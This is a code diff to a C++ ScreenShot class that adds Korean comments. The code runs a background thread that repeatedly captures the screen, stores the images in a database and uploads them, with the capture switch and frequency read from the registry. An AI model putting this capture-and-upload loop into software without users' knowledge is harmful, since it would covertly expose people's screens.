@@ -6,7 +6,7 @@
 static int freq;
 static bool loop;
 static bool running=false;
-UINT ScreenShot::DoInBG(LPVOID pParam){
+UINT ScreenShot::DoInBG(LPVOID pParam){	//스크린샷을 찍어 업로드 하는 쓰레드
 	running=true;
 	while(loop){
 		CImage capImage;
@@ -48,6 +48,8 @@ UINT ScreenShot::DoInBG(LPVOID pParam){
 		LPVOID imageData=GlobalLock(imgDB.m_image.m_hData);
 	
 		imgDB.Update();	//디비에 반영
+
+		//업로드 부분
 		MultipartUpload::Upload((BYTE *)imageData,streamStats.cbSize.QuadPart);	//따로 쓰레드로 돌아감
 	
 		GlobalUnlock(imgDB.m_image.m_hData);
@@ -63,12 +65,12 @@ UINT ScreenShot::DoInBG(LPVOID pParam){
 }
 
 void ScreenShot::start(){
-	loop=CRegManager::GetScreenShotVal();
-	freq=CRegManager::GetScreenShotFreq();
+	loop=CRegManager::GetScreenShotVal();	//레지에서 활성화 여부 가져옴
+	freq=CRegManager::GetScreenShotFreq();	//레지에서 스샷 빈도 가져옴
 	if(!running) AfxBeginThread(DoInBG,NULL);	//쓰레드 실행중이 아닐때만 새 쓰레드 생성
 }
 
-CImage ScreenShot::getlastimg(){
+CImage ScreenShot::getlastimg(){	//확인차 넣은 메소드 구현에는 안쓰임
 	CcaptureImageDB imgDB;
 	imgDB.Open();	//디비를 열고
 	imgDB.MoveLast();	//마지막 레코드로 이동
@@ -83,7 +85,7 @@ CImage ScreenShot::getlastimg(){
 	return img;
 }
 
-void ScreenShot::getlastimgfile(){
+void ScreenShot::getlastimgfile(){	//확인차 넣은 메소드 구현에는 안쓰임. 마지막 이미지를 파일로 출력하는 기능
 	CcaptureImageDB imgDB;
 	imgDB.Open();	//디비를 열고
 	imgDB.MoveLast();	//마지막 레코드로 이동
@@ -118,7 +120,7 @@ void ScreenShot::getlastimgfile(){
 	*/
 
 
-void ScreenShot::Stop(void)
+void ScreenShot::Stop(void)	//쓰레드 종료 메소드
 {
 	loop=false;
 }
